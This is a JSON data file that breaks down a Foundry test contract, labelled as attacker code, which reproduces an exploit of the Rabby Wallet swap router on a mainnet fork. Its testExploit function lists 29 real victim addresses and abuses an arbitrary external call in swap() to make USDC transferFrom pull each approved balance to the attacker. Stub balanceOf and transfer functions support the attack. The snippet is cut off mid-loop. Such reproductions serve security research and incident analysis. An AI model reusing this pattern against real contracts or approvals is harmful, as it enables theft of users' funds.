[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(\n        address\n    ) external pure returns (uint256) {\n        return 100e18;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 15_724_451);\n        vm.label(address(RABBYSWAP_ROUTER), \"RABBYSWAP_ROUTER\");\n        vm.label(address(USDT_TOKEN), \"USDT_TOKEN\");\n        vm.label(address(USDC_TOKEN), \"USDC_TOKEN\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\n            \"[Start] Attacker USDC balance before exploit\", USDC_TOKEN.balanceOf(address(this)), 6\n        );\n\n        // Somehow attacker got these EOA addresses that approved the Rabby Wallet Swap Router contract.\n        // ...Maybe the attacker grepped the history Txs and found those victims that interacted with the Swap Router contract.\n        address[29] memory victims = [\n            0x94228872bb16CBCDfe010c42a8e456d15B366bF1,\n            0x6a3BCee1eBeBDaA099a46d21a355D0FF1C521fCB,\n            0xDAcCce559a0571083556f39d05b177579613D83b,\n            0x720610ed4925676D971B0ae5b3080bd233E19038,\n            0xf9e1D1e9F22c96752356AdFd377231528c7E851E,\n            0xAF22b1692dEe5929952cFBA4D9a74c0952C712C8,\n            0xFcdB212E7e7588D2dd2cc44C30F6C79fB507DB4B,\n            0x9A93C5f7680724F6b7097085B0052A56D80615Bd,\n            0x491968b05D95979BA3a52D73D8a39EA96693f011,\n            0xc64284527B04A48c6673dF62f5B48188Ccfdf658,\n            0x9df99a08710615FaBcb16Ea0b05ED039e8a5F644,\n            0xc897967Bab363caDD4F3001d51506bCc5DD6f6C2,\n            0x48aa9d67cb713804C005516BCa7769c159d7897C,\n            0xB9AFb68de4E1f89acA813ca75d87bd86a1a17aa3,\n            0xC10898edA672fDFc4Ac0228bB1Da9b2bF54C768f,\n            0x73B37009778048f6dB88fD602582473e74e5019a,\n            0xbB4b297cC5257D8ab7F280361C96b3A27014EbBb,\n            0x5BE2539BaA7622865FDc401bA26adB636d78f5Bf,\n            0x25939E70Dc19ef0aa2819f5c6544712a36eEbfa7,\n            0x5853eD4f26A3fceA565b3FBC698bb19cdF6DEB85,\n            0x73a6b16aD155aCd15F1A69e61369DB883dFC0b0b,\n            0xE451DC0948F33B1261c585f0DB84cca9Ab69F3A4,\n            0xd38023D7Ee559672fA00eA5156734710bcc0e781,\n            0x059c1592696D430E7bA8cccC984BA9639b8CF90B,\n            0x69AfE88F22F416fFB7d2Bf119b31EBc0D0d85325,\n            0xD506Fb416B0ad8DBf7859B9B38c435405E3d1110,\n            0xe7b6804A9fE8aDEb109112A8A2CF40093E0d55fc,\n            0xeEBbAf298bb8B5076723d69AF61bf75a5C2ad8d6,\n            0x1Fc550e98aD3021e32C47A84019F77a0792c60B7\n        ];\n\n        for (uint256 i; i < victims.length; ++i) {\n            // Step 1: Check the victim's USDC balance and allowance to RABBYSWAP_ROUTER\n            uint256 vic_balance = USDC_TOKEN.balanceOf(victims[i]);\n            uint256 vic_allowance = USDC_TOKEN.allowance(victims[i], address(RABBYSWAP_ROUTER));\n\n            // Step 2: If allowance >= balance: exploit!\n            if (vic_allowance >= vic_balance) {\n                // Classic arbitrary external calls `swap()` vulnerability, and the parameter `address dexRouter` is controllable.\n                bytes memory usdc_callbackData = abi.encodeWithSignature(\n                    \"transferFrom(address,address,uint256)\", victims[i], address(this), vic_balance\n                );\n                RABBYSWAP_ROUTER.swap(\n                    address(USDT_TOKEN),\n                    0,\n                    address(this),\n                    4660,\n                    address(USDC_TOKEN),\n                    address(USDC_TOKEN),\n                    usdc_callbackData,\n                    block.timestamp\n                );\n            }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address, uint256) external pure returns (bool) {\n        return true;\n    }\n\n",
    "description": ""
  }
]